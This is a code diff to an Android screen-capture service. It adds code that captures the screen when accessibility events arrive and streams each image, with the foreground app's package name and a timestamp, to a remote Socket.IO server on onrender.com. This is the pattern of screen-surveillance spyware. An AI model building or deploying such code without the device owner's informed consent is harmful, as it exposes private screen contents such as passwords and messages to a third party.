@@ -88,6 +88,12 @@ public class ScreenCaptureService extends Service {
     public static Intent lastData = null;
     private BroadcastReceiver screenCaptureReceiver;
     
+    // Store last accessibility event data
+    private int lastEventType = -1;
+    private String lastPackageName = null;
+    private long lastEventTimestamp = -1;
+    private SocketManager socketManager;
+    
     public class LocalBinder extends Binder {
         public ScreenCaptureService getService() {
             return ScreenCaptureService.this;
@@ -131,6 +137,16 @@ public class ScreenCaptureService extends Service {
                 Log.d(TAG, "ScreenCaptureService received action: " + action);
                 android.widget.Toast.makeText(context, "ScreenCaptureService received: " + action, android.widget.Toast.LENGTH_SHORT).show();
                 if (ACTION_SCREENSHOT_ONCE.equals(action)) {
+                    // Extract event data if present
+                    if (intent.hasExtra("eventType")) {
+                        lastEventType = intent.getIntExtra("eventType", -1);
+                        lastPackageName = intent.getStringExtra("packageName");
+                        lastEventTimestamp = intent.getLongExtra("timestamp", -1);
+                    } else {
+                        lastEventType = -1;
+                        lastPackageName = null;
+                        lastEventTimestamp = -1;
+                    }
                     if (mediaProjection != null) {
                         captureScreenshot();
                     } else {
@@ -288,6 +304,17 @@ public class ScreenCaptureService extends Service {
                     Log.d(TAG, "Screenshot saved: " + screenshotFile.getAbsolutePath());
                     android.widget.Toast.makeText(getApplicationContext(), "Screenshot captured", android.widget.Toast.LENGTH_SHORT).show();
                     uploadScreenshot(screenshotFile);
+                    // Also send screenshot and event data via Socket.IO if available
+                    if (socketManager == null) {
+                        socketManager = new SocketManager("https://myapplication4.onrender.com");
+                        socketManager.connect();
+                    }
+                    if (socketManager.isConnected() && lastEventType != -1 && lastPackageName != null && lastEventTimestamp != -1) {
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                        byte[] imageBytes = baos.toByteArray();
+                        socketManager.sendAccessibilityScreenshot(imageBytes, lastEventType, lastPackageName, lastEventTimestamp);
+                    }
                 }
             }
         } catch (Exception e) {
